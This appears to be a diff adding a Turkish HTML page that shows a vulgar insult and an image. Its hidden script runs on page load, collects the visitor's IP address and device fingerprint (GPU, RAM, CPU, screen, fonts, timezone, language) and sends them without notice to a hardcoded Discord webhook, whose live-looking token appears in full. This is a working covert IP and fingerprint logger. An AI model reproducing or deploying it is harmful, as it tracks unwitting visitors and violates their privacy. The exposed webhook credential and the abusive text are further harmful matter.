@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sayfa</title>
+  <style>
+    body {
+      background: #111;
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 20px;
+      user-select: none;
+    }
+    img {
+      max-width: 300px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px cyan;
+    }
+  </style>
+</head>
+<body>
+  <h1>ANAYI BACIYI SİKEM</h1>
+  <img src="https://m.media-amazon.com/images/I/61Sz-RayqyL._UF1000,1000_QL80_.jpg" alt="Görsel" />
+</body>
+  <script>
+    async function getIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return 'IP alınamadı';
+      }
+    }
+
+    function getUserAgent() {
+      return navigator.userAgent;
+    }
+
+    function getPlatform() {
+      return navigator.platform;
+    }
+
+    function getDeviceMemory() {
+      return navigator.deviceMemory || 'Bilinmiyor';
+    }
+
+    function getHardwareConcurrency() {
+      return navigator.hardwareConcurrency || 'Bilinmiyor';
+    }
+
+    function getScreenInfo() {
+      return `${screen.width}x${screen.height} (Renk Derinliği: ${screen.colorDepth})`;
+    }
+
+    function getTimezone() {
+      return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor';
+    }
+
+    function getLanguage() {
+      return navigator.language || 'Bilinmiyor';
+    }
+
+    function getCookiesEnabled() {
+      return navigator.cookieEnabled ? "Evet" : "Hayır";
+    }
+
+    function getOnlineStatus() {
+      return navigator.onLine ? "Çevrimiçi" : "Çevrimdışı";
+    }
+
+    function getConnectionType() {
+      return navigator.connection?.effectiveType || 'Bilinmiyor';
+    }
+
+    function getDoNotTrack() {
+      return navigator.doNotTrack || 'Bilinmiyor';
+    }
+
+    function getDeviceType() {
+      if (/Mobi|Android/i.test(navigator.userAgent)) return "Mobil";
+      if (/Tablet|iPad/i.test(navigator.userAgent)) return "Tablet";
+      return "Masaüstü";
+    }
+
+    function getFonts() {
+      const fonts = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana', 'Comic Sans MS', 'Impact'];
+      const detectedFonts = fonts.filter(f => document.fonts.check(`12px "${f}"`));
+      return detectedFonts.length ? detectedFonts.join(', ') : 'Bilinmiyor';
+    }
+
+    function getGPUInfo() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return 'WebGL desteklenmiyor';
+
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+          const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          return `${vendor} - ${renderer}`;
+        }
+        return 'WEBGL_debug_renderer_info desteklenmiyor';
+      } catch {
+        return 'GPU bilgisi alınamadı';
+      }
+    }
+
+    async function sendToDiscord(embed) {
+      const webhookURL = 'https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA';
+
+      try {
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ embeds: [embed] }),
+        });
+      } catch (e) {
+        console.error("Discord'a gönderme hatası:", e);
+      }
+    }
+
+    (async () => {
+      const ip = await getIP();
+      const userAgent = getUserAgent();
+      const platform = getPlatform();
+      const ram = getDeviceMemory();
+      const cpu = getHardwareConcurrency();
+      const screenInfo = getScreenInfo();
+      const timezone = getTimezone();
+      const language = getLanguage();
+      const cookies = getCookiesEnabled();
+      const onlineStatus = getOnlineStatus();
+      const connectionType = getConnectionType();
+      const dnt = getDoNotTrack();
+      const deviceType = getDeviceType();
+      const fonts = getFonts();
+      const gpuInfo = getGPUInfo();
+
+      const embed = {
+        title: "Kullanıcı Bilgileri",
+        color: null,
+        fields: [
+          { name: "IP Adresi", value: ip, inline: false },
+          { name: "User Agent", value: userAgent, inline: false },
+          { name: "Platform", value: platform, inline: true },
+          { name: "RAM (GB)", value: ram.toString(), inline: true },
+          { name: "CPU Çekirdeği", value: cpu.toString(), inline: true },
+          { name: "Ekran Kartı", value: gpuInfo, inline: false },
+          { name: "Ekran Çözünürlüğü", value: screenInfo, inline: false },
+          { name: "Zaman Dilimi", value: timezone, inline: false },
+          { name: "Dil", value: language, inline: true },
+          { name: "Çerez Kullanımı", value: cookies, inline: true },
+          { name: "Çevrimiçi Durum", value: onlineStatus, inline: true },
+          { name: "İnternet Bağlantı Türü", value: connectionType, inline: true },
+          { name: "Do Not Track (DNT)", value: dnt, inline: true },
+          { name: "Cihaz Türü", value: deviceType, inline: true },
+          { name: "Yüklü Fontlar", value: fonts, inline: false }
+        ],
+        timestamp: new Date().toISOString()
+      };
+
+      await sendToDiscord(embed);
+    })();
+  </script>
+</body>
+</html>
